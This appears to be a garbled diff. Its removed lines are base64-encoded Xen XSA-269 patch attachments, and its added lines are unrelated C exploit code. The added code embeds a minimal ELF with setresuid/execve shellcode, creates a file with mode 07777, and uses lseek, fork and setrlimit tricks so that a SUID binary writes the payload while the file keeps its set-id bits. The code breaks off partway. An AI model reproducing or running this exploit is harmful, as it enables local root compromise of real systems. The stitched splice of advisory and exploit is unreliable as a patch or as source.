-fQorCiAgICAgY2FzZSBNU1JfSUEzMl9GRUFUVVJFX0NPTlRST0w6CiAgICAg
-Y2FzZSBNU1JfSUEzMl9WTVhfQkFTSUMgLi4uIE1TUl9JQTMyX1ZNWF9WTUZV
-TkM6CiAgICAgICAgIC8qIE5vbmUgb2YgdGhlc2UgTVNScyBhcmUgd3JpdGVh
-YmxlLiAqLwo=
+int main(int argc, char **argv) {
+// No slashes allowed, everything else is OK.
+  char suidExecMinimalElf[] = {
+      0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+      0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
+      0x80, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0xf8, 0x00, 0x00, 0x00,
+      0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x02, 0x00, 0x28, 0x00,
+      0x05, 0x00, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+      0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0xa2, 0x00, 0x00, 0x00,
+      0xa2, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
+      0x01, 0x00, 0x00, 0x00, 0xa4, 0x00, 0x00, 0x00, 0xa4, 0x90, 0x04, 0x08,
+      0xa4, 0x90, 0x04, 0x08, 0x09, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
+      0x06, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xc0, 0x89, 0xc8,
+      0x89, 0xd0, 0x89, 0xd8, 0x04, 0xd2, 0xcd, 0x80, 0x31, 0xc0, 0x89, 0xd0,
+      0xb0, 0x0b, 0x89, 0xe1, 0x83, 0xc1, 0x08, 0x8b, 0x19, 0xcd, 0x80
+  };
 
---=separator
-Content-Type: application/octet-stream; name="xsa269-4.8.patch"
-Content-Disposition: attachment; filename="xsa269-4.8.patch"
-Content-Transfer-Encoding: base64
+  int destFd=open(argv[1], O_RDWR|O_CREAT, 07777);
+  if(destFd<0) {
+    fprintf(stderr, "Failed to open %s, error %s\n", argv[1], strerror(errno));
+    return(1);
+  }
 
-RnJvbTogQW5kcmV3IENvb3BlciA8YW5kcmV3LmNvb3BlcjNAY2l0cml4LmNv
-bT4KU3ViamVjdDogeDg2L3Z0eDogRml4IHRoZSBjaGVja2luZyBmb3IgdW5r
-bm93bi9pbnZhbGlkIE1TUl9ERUJVR0NUTCBiaXRzCgpUaGUgVlBNVV9NT0RF
-X09GRiBlYXJseS1leGl0IGluIHZwbXVfZG9fd3Jtc3IoKSBpbnRyb2R1Y2Vk
-IGJ5IGMvcwoxMWZlOTk4ZTU2IGJ5cGFzc2VzIGFsbCByZXNlcnZlZCBiaXQg
-Y2hlY2tpbmcgaW4gdGhlIGdlbmVyYWwgY2FzZS4gIEFzIGEKcmVzdWx0LCBh
-IGd1ZXN0IGNhbiBlbmFibGUgQlRTIHdoZW4gaXQgc2hvdWxkbid0IGJlIHBl
-cm1pdHRlZCB0bywgYW5kCmxvY2sgdXAgdGhlIGVudGlyZSBob3N0LgoKV2l0
-aCB2UE1VIGFjdGl2ZSAobm90IGEgc2VjdXJpdHkgc3VwcG9ydGVkIGNvbmZp
-Z3VyYXRpb24sIGJ1dCB1c2VmdWwgZm9yCmRlYnVnZ2luZyksIHRoZSByZXNl
-cnZlZCBiaXQgY2hlY2tpbmcgaW4gYnJva2VuLCBjYXVzZWQgYnkgdGhlIG9y
-aWdpbmFsCkJUUyBjaGFuZ2VzZXQgMWE4YWE3NWVkLgoKRnJvbSBhIGNvcnJl
-Y3RuZXNzIHN0YW5kcG9pbnQsIGl0IGlzIG5vdCBwb3NzaWJsZSB0byBoYXZl
-IHR3byBkaWZmZXJlbnQKcGllY2VzIG9mIGNvZGUgcmVzcG9uc2libGUgZm9y
-IGRpZmZlcmVudCBwYXJ0cyBvZiB2YWx1ZSBjaGVja2luZywgaWYKdGhlcmUg
-aXNuJ3QgYW4gYWNjdW11bGF0aW9uIG9mIGJpdHMgd2hpY2ggaGF2ZSBiZWVu
-IGNoZWNrZWQuICBBCnByYWN0aWNhbCB1cHNob3Qgb2YgdGhpcyBpcyB0aGF0
-IGEgZ3Vlc3QgY2FuIHNldCBhbnkgdmFsdWUgaXQKd2lzaGVzICh1c3VhbGx5
-IHJlc3VsdGluZyBpbiBhIHZtZW50cnkgZmFpbHVyZSBmb3IgYmFkIGd1ZXN0
-IHN0YXRlKS4KClRoZXJlZm9yZSwgZml4IHRoaXMgYnkgaW1wbGVtZW50aW5n
-IGFsbCB0aGUgcmVzZXJ2ZWQgYml0IGNoZWNraW5nIGluIHRoZQptYWluIE1T
-Ul9ERUJVR0NUTCBibG9jaywgYW5kIHJlbW92aW5nIGFsbCBoYW5kbGluZyBv
-ZiBERUJVR0NUTCBmcm9tIHRoZQp2UE1VIE1TUiBsb2dpYy4KClRoaXMgaXMg
-WFNBLTI2OQoKU2lnbmVkLW9mZi1ieTogQW5kcmV3IENvb3BlciA8YW5kcmV3
-LmNvb3BlcjNAY2l0cml4LmNvbT4KUmV2aWV3ZWQtYnk6IEphbiBCZXVsaWNo
-IDxqYmV1bGljaEBzdXNlLmNvbT4KCmRpZmYgLS1naXQgYS94ZW4vYXJjaC94
-ODYvY3B1L3ZwbXVfaW50ZWwuYyBiL3hlbi9hcmNoL3g4Ni9jcHUvdnBtdV9p
-bnRlbC5jCmluZGV4IDdmOWFkZDEuLjYyNzZjMTAgMTAwNjQ0Ci0tLSBhL3hl
-bi9hcmNoL3g4Ni9jcHUvdnBtdV9pbnRlbC5jCisrKyBiL3hlbi9hcmNoL3g4
-Ni9jcHUvdnBtdV9pbnRlbC5jCkBAIC02OCwxMCArNjgsNiBAQAogI2RlZmlu
-ZSBNU1JfUE1DX0FMSUFTX01BU0sgICAgICAgKH4oTVNSX0lBMzJfUEVSRkNU
-UjAgXiBNU1JfSUEzMl9BX1BFUkZDVFIwKSkKIHN0YXRpYyBib29sX3QgX19y
-ZWFkX21vc3RseSBmdWxsX3dpZHRoX3dyaXRlOwogCi0vKiBJbnRlbC1zcGVj
-aWZpYyBWUE1VIGZlYXR1cmVzICovCi0jZGVmaW5lIFZQTVVfQ1BVX0hBU19E
-UyAgICAgICAgICAgICAgICAgICAgIDB4MTAwIC8qIEhhcyBEZWJ1ZyBTdG9y
-ZSAqLwotI2RlZmluZSBWUE1VX0NQVV9IQVNfQlRTICAgICAgICAgICAgICAg
-ICAgICAweDIwMCAvKiBIYXMgQnJhbmNoIFRyYWNlIFN0b3JlICovCi0KIC8q
-CiAgKiBNU1JfQ09SRV9QRVJGX0ZJWEVEX0NUUl9DVFJMIGNvbnRhaW5zIHRo
-ZSBjb25maWd1cmF0aW9uIG9mIGFsbCBmaXhlZAogICogY291bnRlcnMuIDQg
-Yml0cyBmb3IgZXZlcnkgY291bnRlci4KQEAgLTU2MywyNyArNTU5LDcgQEAg
-c3RhdGljIGludCBjb3JlMl92cG11X2RvX3dybXNyKHVuc2lnbmVkIGludCBt
-c3IsIHVpbnQ2NF90IG1zcl9jb250ZW50LAogICAgIHVpbnQ2NF90ICplbmFi
-bGVkX2NudHJzOwogCiAgICAgaWYgKCAhY29yZTJfdnBtdV9tc3JfY29tbW9u
-X2NoZWNrKG1zciwgJnR5cGUsICZpbmRleCkgKQotICAgIHsKLSAgICAgICAg
-LyogU3BlY2lhbCBoYW5kbGluZyBmb3IgQlRTICovCi0gICAgICAgIGlmICgg
-bXNyID09IE1TUl9JQTMyX0RFQlVHQ1RMTVNSICkKLSAgICAgICAgewotICAg
-ICAgICAgICAgc3VwcG9ydGVkIHw9IElBMzJfREVCVUdDVExNU1JfVFIgfCBJ
-QTMyX0RFQlVHQ1RMTVNSX0JUUyB8Ci0gICAgICAgICAgICAgICAgICAgICAg
-ICAgSUEzMl9ERUJVR0NUTE1TUl9CVElOVDsKLQotICAgICAgICAgICAgaWYg
-KCBjcHVfaGFzKCZjdXJyZW50X2NwdV9kYXRhLCBYODZfRkVBVFVSRV9EU0NQ
-TCkgKQotICAgICAgICAgICAgICAgIHN1cHBvcnRlZCB8PSBJQTMyX0RFQlVH
-Q1RMTVNSX0JUU19PRkZfT1MgfAotICAgICAgICAgICAgICAgICAgICAgICAg
-ICAgICBJQTMyX0RFQlVHQ1RMTVNSX0JUU19PRkZfVVNSOwotICAgICAgICAg
-ICAgaWYgKCAhKG1zcl9jb250ZW50ICYgfnN1cHBvcnRlZCkgJiYKLSAgICAg
-ICAgICAgICAgICAgdnBtdV9pc19zZXQodnBtdSwgVlBNVV9DUFVfSEFTX0JU
-UykgKQotICAgICAgICAgICAgICAgIHJldHVybiAwOwotICAgICAgICAgICAg
-aWYgKCAobXNyX2NvbnRlbnQgJiBzdXBwb3J0ZWQpICYmCi0gICAgICAgICAg
-ICAgICAgICF2cG11X2lzX3NldCh2cG11LCBWUE1VX0NQVV9IQVNfQlRTKSAp
-Ci0gICAgICAgICAgICAgICAgcHJpbnRrKFhFTkxPR19HX1dBUk5JTkcKLSAg
-ICAgICAgICAgICAgICAgICAgICAgIiVwdjogRGVidWcgU3RvcmUgdW5zdXBw
-b3J0ZWQgb24gdGhpcyBDUFVcbiIsCi0gICAgICAgICAgICAgICAgICAgICAg
-IGN1cnJlbnQpOwotICAgICAgICB9CiAgICAgICAgIHJldHVybiAtRUlOVkFM
-OwotICAgIH0KIAogICAgIEFTU0VSVCghc3VwcG9ydGVkKTsKIApkaWZmIC0t
-Z2l0IGEveGVuL2FyY2gveDg2L2h2bS92bXgvdm14LmMgYi94ZW4vYXJjaC94
-ODYvaHZtL3ZteC92bXguYwppbmRleCA5NTU2NDNjLi5kMDdkOTQxIDEwMDY0
-NAotLS0gYS94ZW4vYXJjaC94ODYvaHZtL3ZteC92bXguYworKysgYi94ZW4v
-YXJjaC94ODYvaHZtL3ZteC92bXguYwpAQCAtMjk3Niw2ICsyOTc2LDggQEAg
-c3RhdGljIGludCB2bXhfbXNyX3dyaXRlX2ludGVyY2VwdCh1bnNpZ25lZCBp
-bnQgbXNyLCB1aW50NjRfdCBtc3JfY29udGVudCkKIAogICAgIHN3aXRjaCAo
-IG1zciApCiAgICAgeworICAgICAgICB1aW50NjRfdCByc3ZkOworCiAgICAg
-Y2FzZSBNU1JfSUEzMl9TWVNFTlRFUl9DUzoKICAgICAgICAgX192bXdyaXRl
-KEdVRVNUX1NZU0VOVEVSX0NTLCBtc3JfY29udGVudCk7CiAgICAgICAgIGJy
-ZWFrOwpAQCAtMjk5MCwxNyArMjk5MiwyOSBAQCBzdGF0aWMgaW50IHZteF9t
-c3Jfd3JpdGVfaW50ZXJjZXB0KHVuc2lnbmVkIGludCBtc3IsIHVpbnQ2NF90
-IG1zcl9jb250ZW50KQogICAgICAgICBfX3Ztd3JpdGUoR1VFU1RfU1lTRU5U
-RVJfRUlQLCBtc3JfY29udGVudCk7CiAgICAgICAgIGJyZWFrOwogICAgIGNh
-c2UgTVNSX0lBMzJfREVCVUdDVExNU1I6IHsKKyAgICAgICAgdWludDMyX3Qg
-ZWJ4LCBlY3ggPSAwOwogICAgICAgICBpbnQgaSwgcmMgPSAwOwotICAgICAg
-ICB1aW50NjRfdCBzdXBwb3J0ZWQgPSBJQTMyX0RFQlVHQ1RMTVNSX0xCUiB8
-IElBMzJfREVCVUdDVExNU1JfQlRGOwogCi0gICAgICAgIGlmICggYm9vdF9j
-cHVfaGFzKFg4Nl9GRUFUVVJFX1JUTSkgKQotICAgICAgICAgICAgc3VwcG9y
-dGVkIHw9IElBMzJfREVCVUdDVExNU1JfUlRNOwotICAgICAgICBpZiAoIG1z
-cl9jb250ZW50ICYgfnN1cHBvcnRlZCApCisgICAgICAgIHJzdmQgPSB+KElB
-MzJfREVCVUdDVExNU1JfTEJSIHwgSUEzMl9ERUJVR0NUTE1TUl9CVEYpOwor
-CisgICAgICAgIC8qIFRPRE86IFdpcmUgdlBNVSBzZXR0aW5ncyBwcm9wZXJs
-eSB0aHJvdWdoIHRoZSBDUFVJRCBwb2xpY3kgKi8KKyAgICAgICAgaWYgKCB2
-cG11X2lzX3NldCh2Y3B1X3ZwbXUodiksIFZQTVVfQ1BVX0hBU19CVFMpICkK
-ICAgICAgICAgewotICAgICAgICAgICAgLyogUGVyaGFwcyBzb21lIG90aGVy
-IGJpdHMgYXJlIHN1cHBvcnRlZCBpbiB2cG11LiAqLwotICAgICAgICAgICAg
-aWYgKCB2cG11X2RvX3dybXNyKG1zciwgbXNyX2NvbnRlbnQsIHN1cHBvcnRl
-ZCkgKQotICAgICAgICAgICAgICAgIGJyZWFrOworICAgICAgICAgICAgcnN2
-ZCAmPSB+KElBMzJfREVCVUdDVExNU1JfVFIgfCBJQTMyX0RFQlVHQ1RMTVNS
-X0JUUyB8CisgICAgICAgICAgICAgICAgICAgICAgSUEzMl9ERUJVR0NUTE1T
-Ul9CVElOVCk7CisKKyAgICAgICAgICAgIGlmICggY3B1X2hhcygmY3VycmVu
-dF9jcHVfZGF0YSwgWDg2X0ZFQVRVUkVfRFNDUEwpICkKKyAgICAgICAgICAg
-ICAgICByc3ZkICY9IH4oSUEzMl9ERUJVR0NUTE1TUl9CVFNfT0ZGX09TIHwK
-KyAgICAgICAgICAgICAgICAgICAgICAgICAgSUEzMl9ERUJVR0NUTE1TUl9C
-VFNfT0ZGX1VTUik7CiAgICAgICAgIH0KKworICAgICAgICBodm1fY3B1aWQo
-NywgTlVMTCwgJmVieCwgJmVjeCwgTlVMTCk7CisgICAgICAgIGlmICggZWJ4
-ICYgY3B1ZmVhdF9tYXNrKFg4Nl9GRUFUVVJFX1JUTSkgKQorICAgICAgICAg
-ICAgcnN2ZCAmPSB+SUEzMl9ERUJVR0NUTE1TUl9SVE07CisKKyAgICAgICAg
-aWYgKCBtc3JfY29udGVudCAmIHJzdmQgKQorICAgICAgICAgICAgZ290byBn
-cF9mYXVsdDsKKwogICAgICAgICBpZiAoIG1zcl9jb250ZW50ICYgSUEzMl9E
-RUJVR0NUTE1TUl9MQlIgKQogICAgICAgICB7CiAgICAgICAgICAgICBjb25z
-dCBzdHJ1Y3QgbGJyX2luZm8gKmxiciA9IGxhc3RfYnJhbmNoX21zcl9nZXQo
-KTsKZGlmZiAtLWdpdCBhL3hlbi9pbmNsdWRlL2FzbS14ODYvdnBtdS5oIGIv
-eGVuL2luY2x1ZGUvYXNtLXg4Ni92cG11LmgKaW5kZXggZWQ5ZWMwNy4uNzVi
-MTk3MyAxMDA2NDQKLS0tIGEveGVuL2luY2x1ZGUvYXNtLXg4Ni92cG11LmgK
-KysrIGIveGVuL2luY2x1ZGUvYXNtLXg4Ni92cG11LmgKQEAgLTc3LDYgKzc3
-LDEwIEBAIHN0cnVjdCB2cG11X3N0cnVjdCB7CiAvKiBQVihIKSBndWVzdHM6
-IFZQTVUgcmVnaXN0ZXJzIGFyZSBhY2Nlc3NlZCBieSBndWVzdCBmcm9tIHNo
-YXJlZCBwYWdlICovCiAjZGVmaW5lIFZQTVVfQ0FDSEVEICAgICAgICAgICAg
-ICAgICAgICAgICAgIDB4NDAKIAorLyogSW50ZWwtc3BlY2lmaWMgVlBNVSBm
-ZWF0dXJlcyAqLworI2RlZmluZSBWUE1VX0NQVV9IQVNfRFMgICAgICAgICAg
-ICAgICAgICAgICAweDEwMCAvKiBIYXMgRGVidWcgU3RvcmUgKi8KKyNkZWZp
-bmUgVlBNVV9DUFVfSEFTX0JUUyAgICAgICAgICAgICAgICAgICAgMHgyMDAg
-LyogSGFzIEJyYW5jaCBUcmFjZSBTdG9yZSAqLworCiBzdGF0aWMgaW5saW5l
-IHZvaWQgdnBtdV9zZXQoc3RydWN0IHZwbXVfc3RydWN0ICp2cG11LCBjb25z
-dCB1MzIgbWFzaykKIHsKICAgICB2cG11LT5mbGFncyB8PSBtYXNrOwo=
+  char *suidWriteNext=suidExecMinimalElf;
+  char *suidWriteEnd=suidExecMinimalElf+sizeof(suidExecMinimalElf);
+  while(suidWriteNext!=suidWriteEnd) {
+    char *suidWriteTestPos=suidWriteNext;
+    while((!*suidWriteTestPos)&&(suidWriteTestPos!=suidWriteEnd))
+      suidWriteTestPos++;
+// We cannot write any 0-bytes. So let seek fill up the file wihh
+// null-bytes for us.
+    lseek(destFd, suidWriteTestPos-suidExecMinimalElf, SEEK_SET);
+    suidWriteNext=suidWriteTestPos;
+    while((*suidWriteTestPos)&&(suidWriteTestPos!=suidWriteEnd))
+      suidWriteTestPos++;
 
---=separator
-Content-Type: application/octet-stream; name="xsa269-4.10.patch"
-Content-Disposition: attachment; filename="xsa269-4.10.patch"
-Content-Transfer-Encoding: base64
+    int result=fork();
+    if(!result) {
+      struct rlimit limits;
 
-RnJvbSAwNjUzYTA1OTg2MTNlYTlkNzU5OGFkOGY5YWNlODllZDc0OTg0MTBj
-IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBBbmRyZXcgQ29vcGVy
-IDxhbmRyZXcuY29vcGVyM0BjaXRyaXguY29tPgpEYXRlOiBNb24sIDMwIEp1
-bCAyMDE4IDExOjAxOjI4ICswMTAwClN1YmplY3Q6IFtQQVRDSF0geDg2L3Z0
-eDogRml4IHRoZSBjaGVja2luZyBmb3IgdW5rbm93bi9pbnZhbGlkIE1TUl9E
-RUJVR0NUTAogYml0cwoKVGhlIFZQTVVfTU9ERV9PRkYgZWFybHktZXhpdCBp
-biB2cG11X2RvX3dybXNyKCkgaW50cm9kdWNlZCBieSBjL3MKMTFmZTk5OGU1
-NiBieXBhc3NlcyBhbGwgcmVzZXJ2ZWQgYml0IGNoZWNraW5nIGluIHRoZSBn
-ZW5lcmFsIGNhc2UuICBBcyBhCnJlc3VsdCwgYSBndWVzdCBjYW4gZW5hYmxl
-IEJUUyB3aGVuIGl0IHNob3VsZG4ndCBiZSBwZXJtaXR0ZWQgdG8sIGFuZAps
-b2NrIHVwIHRoZSBlbnRpcmUgaG9zdC4KCldpdGggdlBNVSBhY3RpdmUgKG5v
-dCBhIHNlY3VyaXR5IHN1cHBvcnRlZCBjb25maWd1cmF0aW9uLCBidXQgdXNl
-ZnVsIGZvcgpkZWJ1Z2dpbmcpLCB0aGUgcmVzZXJ2ZWQgYml0IGNoZWNraW5n
-IGluIGJyb2tlbiwgY2F1c2VkIGJ5IHRoZSBvcmlnaW5hbApCVFMgY2hhbmdl
-c2V0IDFhOGFhNzVlZC4KCkZyb20gYSBjb3JyZWN0bmVzcyBzdGFuZHBvaW50
-LCBpdCBpcyBub3QgcG9zc2libGUgdG8gaGF2ZSB0d28gZGlmZmVyZW50CnBp
-ZWNlcyBvZiBjb2RlIHJlc3BvbnNpYmxlIGZvciBkaWZmZXJlbnQgcGFydHMg
-b2YgdmFsdWUgY2hlY2tpbmcsIGlmCnRoZXJlIGlzbid0IGFuIGFjY3VtdWxh
-dGlvbiBvZiBiaXRzIHdoaWNoIGhhdmUgYmVlbiBjaGVja2VkLiAgQQpwcmFj
-dGljYWwgdXBzaG90IG9mIHRoaXMgaXMgdGhhdCBhIGd1ZXN0IGNhbiBzZXQg
-YW55IHZhbHVlIGl0Cndpc2hlcyAodXN1YWxseSByZXN1bHRpbmcgaW4gYSB2
-bWVudHJ5IGZhaWx1cmUgZm9yIGJhZCBndWVzdCBzdGF0ZSkuCgpUaGVyZWZv
-cmUsIGZpeCB0aGlzIGJ5IGltcGxlbWVudGluZyBhbGwgdGhlIHJlc2VydmVk
-IGJpdCBjaGVja2luZyBpbiB0aGUKbWFpbiBNU1JfREVCVUdDVEwgYmxvY2ss
-IGFuZCByZW1vdmluZyBhbGwgaGFuZGxpbmcgb2YgREVCVUdDVEwgZnJvbSB0
-aGUKdlBNVSBNU1IgbG9naWMuCgpUaGlzIGlzIFhTQS0yNjkKClNpZ25lZC1v
-ZmYtYnk6IEFuZHJldyBDb29wZXIgPGFuZHJldy5jb29wZXIzQGNpdHJpeC5j
-b20+ClJldmlld2VkLWJ5OiBKYW4gQmV1bGljaCA8amJldWxpY2hAc3VzZS5j
-b20+Ci0tLQogeGVuL2FyY2gveDg2L2NwdS92cG11X2ludGVsLmMgfCAyMCAt
-LS0tLS0tLS0tLS0tLS0tLS0tLQogeGVuL2FyY2gveDg2L2h2bS92bXgvdm14
-LmMgICAgfCAyNyArKysrKysrKysrKysrKysrKysrKy0tLS0tLS0KIDIgZmls
-ZXMgY2hhbmdlZCwgMjAgaW5zZXJ0aW9ucygrKSwgMjcgZGVsZXRpb25zKC0p
-CgpkaWZmIC0tZ2l0IGEveGVuL2FyY2gveDg2L2NwdS92cG11X2ludGVsLmMg
-Yi94ZW4vYXJjaC94ODYvY3B1L3ZwbXVfaW50ZWwuYwppbmRleCAyMDdlMmU3
-MTJjLi5kNDQ0NGYwZDk0IDEwMDY0NAotLS0gYS94ZW4vYXJjaC94ODYvY3B1
-L3ZwbXVfaW50ZWwuYworKysgYi94ZW4vYXJjaC94ODYvY3B1L3ZwbXVfaW50
-ZWwuYwpAQCAtNTM1LDI3ICs1MzUsNyBAQCBzdGF0aWMgaW50IGNvcmUyX3Zw
-bXVfZG9fd3Jtc3IodW5zaWduZWQgaW50IG1zciwgdWludDY0X3QgbXNyX2Nv
-bnRlbnQsCiAgICAgdWludDY0X3QgKmVuYWJsZWRfY250cnM7CiAKICAgICBp
-ZiAoICFjb3JlMl92cG11X21zcl9jb21tb25fY2hlY2sobXNyLCAmdHlwZSwg
-JmluZGV4KSApCi0gICAgewotICAgICAgICAvKiBTcGVjaWFsIGhhbmRsaW5n
-IGZvciBCVFMgKi8KLSAgICAgICAgaWYgKCBtc3IgPT0gTVNSX0lBMzJfREVC
-VUdDVExNU1IgKQotICAgICAgICB7Ci0gICAgICAgICAgICBzdXBwb3J0ZWQg
-fD0gSUEzMl9ERUJVR0NUTE1TUl9UUiB8IElBMzJfREVCVUdDVExNU1JfQlRT
-IHwKLSAgICAgICAgICAgICAgICAgICAgICAgICBJQTMyX0RFQlVHQ1RMTVNS
-X0JUSU5UOwotCi0gICAgICAgICAgICBpZiAoIGNwdV9oYXMoJmN1cnJlbnRf
-Y3B1X2RhdGEsIFg4Nl9GRUFUVVJFX0RTQ1BMKSApCi0gICAgICAgICAgICAg
-ICAgc3VwcG9ydGVkIHw9IElBMzJfREVCVUdDVExNU1JfQlRTX09GRl9PUyB8
-Ci0gICAgICAgICAgICAgICAgICAgICAgICAgICAgIElBMzJfREVCVUdDVExN
-U1JfQlRTX09GRl9VU1I7Ci0gICAgICAgICAgICBpZiAoICEobXNyX2NvbnRl
-bnQgJiB+c3VwcG9ydGVkKSAmJgotICAgICAgICAgICAgICAgICB2cG11X2lz
-X3NldCh2cG11LCBWUE1VX0NQVV9IQVNfQlRTKSApCi0gICAgICAgICAgICAg
-ICAgcmV0dXJuIDA7Ci0gICAgICAgICAgICBpZiAoIChtc3JfY29udGVudCAm
-IHN1cHBvcnRlZCkgJiYKLSAgICAgICAgICAgICAgICAgIXZwbXVfaXNfc2V0
-KHZwbXUsIFZQTVVfQ1BVX0hBU19CVFMpICkKLSAgICAgICAgICAgICAgICBw
-cmludGsoWEVOTE9HX0dfV0FSTklORwotICAgICAgICAgICAgICAgICAgICAg
-ICAiJXB2OiBEZWJ1ZyBTdG9yZSB1bnN1cHBvcnRlZCBvbiB0aGlzIENQVVxu
-IiwKLSAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudCk7Ci0gICAgICAg
-IH0KICAgICAgICAgcmV0dXJuIC1FSU5WQUw7Ci0gICAgfQogCiAgICAgQVNT
-RVJUKCFzdXBwb3J0ZWQpOwogCmRpZmYgLS1naXQgYS94ZW4vYXJjaC94ODYv
-aHZtL3ZteC92bXguYyBiL3hlbi9hcmNoL3g4Ni9odm0vdm14L3ZteC5jCmlu
-ZGV4IDQ4ZDNjNTRlODQuLjJjNDkwY2Y2MmEgMTAwNjQ0Ci0tLSBhL3hlbi9h
-cmNoL3g4Ni9odm0vdm14L3ZteC5jCisrKyBiL3hlbi9hcmNoL3g4Ni9odm0v
-dm14L3ZteC5jCkBAIC0zMDk3LDExICszMDk3LDE0IEBAIHZvaWQgdm14X3Zs
-YXBpY19tc3JfY2hhbmdlZChzdHJ1Y3QgdmNwdSAqdikKIHN0YXRpYyBpbnQg
-dm14X21zcl93cml0ZV9pbnRlcmNlcHQodW5zaWduZWQgaW50IG1zciwgdWlu
-dDY0X3QgbXNyX2NvbnRlbnQpCiB7CiAgICAgc3RydWN0IHZjcHUgKnYgPSBj
-dXJyZW50OworICAgIGNvbnN0IHN0cnVjdCBjcHVpZF9wb2xpY3kgKmNwID0g
-di0+ZG9tYWluLT5hcmNoLmNwdWlkOwogCiAgICAgSFZNX0RCR19MT0coREJH
-X0xFVkVMX01TUiwgImVjeD0lI3gsIG1zcl92YWx1ZT0lIyJQUkl4NjQsIG1z
-ciwgbXNyX2NvbnRlbnQpOwogCiAgICAgc3dpdGNoICggbXNyICkKICAgICB7
-CisgICAgICAgIHVpbnQ2NF90IHJzdmQ7CisKICAgICBjYXNlIE1TUl9JQTMy
-X1NZU0VOVEVSX0NTOgogICAgICAgICBfX3Ztd3JpdGUoR1VFU1RfU1lTRU5U
-RVJfQ1MsIG1zcl9jb250ZW50KTsKICAgICAgICAgYnJlYWs7CkBAIC0zMTE3
-LDE2ICszMTIwLDI2IEBAIHN0YXRpYyBpbnQgdm14X21zcl93cml0ZV9pbnRl
-cmNlcHQodW5zaWduZWQgaW50IG1zciwgdWludDY0X3QgbXNyX2NvbnRlbnQp
-CiAgICAgICAgIGJyZWFrOwogICAgIGNhc2UgTVNSX0lBMzJfREVCVUdDVExN
-U1I6IHsKICAgICAgICAgaW50IGksIHJjID0gMDsKLSAgICAgICAgdWludDY0
-X3Qgc3VwcG9ydGVkID0gSUEzMl9ERUJVR0NUTE1TUl9MQlIgfCBJQTMyX0RF
-QlVHQ1RMTVNSX0JURjsKIAotICAgICAgICBpZiAoIGJvb3RfY3B1X2hhcyhY
-ODZfRkVBVFVSRV9SVE0pICkKLSAgICAgICAgICAgIHN1cHBvcnRlZCB8PSBJ
-QTMyX0RFQlVHQ1RMTVNSX1JUTTsKLSAgICAgICAgaWYgKCBtc3JfY29udGVu
-dCAmIH5zdXBwb3J0ZWQgKQorICAgICAgICByc3ZkID0gfihJQTMyX0RFQlVH
-Q1RMTVNSX0xCUiB8IElBMzJfREVCVUdDVExNU1JfQlRGKTsKKworICAgICAg
-ICAvKiBUT0RPOiBXaXJlIHZQTVUgc2V0dGluZ3MgcHJvcGVybHkgdGhyb3Vn
-aCB0aGUgQ1BVSUQgcG9saWN5ICovCisgICAgICAgIGlmICggdnBtdV9pc19z
-ZXQodmNwdV92cG11KHYpLCBWUE1VX0NQVV9IQVNfQlRTKSApCiAgICAgICAg
-IHsKLSAgICAgICAgICAgIC8qIFBlcmhhcHMgc29tZSBvdGhlciBiaXRzIGFy
-ZSBzdXBwb3J0ZWQgaW4gdnBtdS4gKi8KLSAgICAgICAgICAgIGlmICggdnBt
-dV9kb193cm1zcihtc3IsIG1zcl9jb250ZW50LCBzdXBwb3J0ZWQpICkKLSAg
-ICAgICAgICAgICAgICBicmVhazsKKyAgICAgICAgICAgIHJzdmQgJj0gfihJ
-QTMyX0RFQlVHQ1RMTVNSX1RSIHwgSUEzMl9ERUJVR0NUTE1TUl9CVFMgfAor
-ICAgICAgICAgICAgICAgICAgICAgIElBMzJfREVCVUdDVExNU1JfQlRJTlQp
-OworCisgICAgICAgICAgICBpZiAoIGNwdV9oYXMoJmN1cnJlbnRfY3B1X2Rh
-dGEsIFg4Nl9GRUFUVVJFX0RTQ1BMKSApCisgICAgICAgICAgICAgICAgcnN2
-ZCAmPSB+KElBMzJfREVCVUdDVExNU1JfQlRTX09GRl9PUyB8CisgICAgICAg
-ICAgICAgICAgICAgICAgICAgIElBMzJfREVCVUdDVExNU1JfQlRTX09GRl9V
-U1IpOwogICAgICAgICB9CisKKyAgICAgICAgaWYgKCBjcC0+ZmVhdC5ydG0g
-KQorICAgICAgICAgICAgcnN2ZCAmPSB+SUEzMl9ERUJVR0NUTE1TUl9SVE07
-CisKKyAgICAgICAgaWYgKCBtc3JfY29udGVudCAmIHJzdmQgKQorICAgICAg
-ICAgICAgZ290byBncF9mYXVsdDsKKwogICAgICAgICBpZiAoIG1zcl9jb250
-ZW50ICYgSUEzMl9ERUJVR0NUTE1TUl9MQlIgKQogICAgICAgICB7CiAgICAg
-ICAgICAgICBjb25zdCBzdHJ1Y3QgbGJyX2luZm8gKmxiciA9IGxhc3RfYnJh
-bmNoX21zcl9nZXQoKTsKLS0gCjIuMTguMAoK
+// We can't truncate, that would remove the setgid property of
+// the file. So make sure the SUID binary does not write too much.
+      limits.rlim_cur=suidWriteTestPos-suidExecMinimalElf;
+      limits.rlim_max=limits.rlim_cur;
+      setrlimit(RLIMIT_FSIZE, &limits);
 
---=separator
-Content-Type: application/octet-stream; name="xsa269-4.11.patch"
-Content-Disposition: attachment; filename="xsa269-4.11.patch"
-Content-Transfer-Encoding: base64
+// Do not rely on some SUID binary to print out the unmodified
+// program name, some OSes might have hardening against that.
+// Let the ld-loader will do that for us.
+      limits.rlim_cur=1<<22;
+      limits.rlim_max=limits.rlim_cur;
+      result=setrlimit(RLIMIT_AS, &limits);
 
-RnJvbTogQW5kcmV3IENvb3BlciA8YW5kcmV3LmNvb3BlcjNAY2l0cml4LmNv
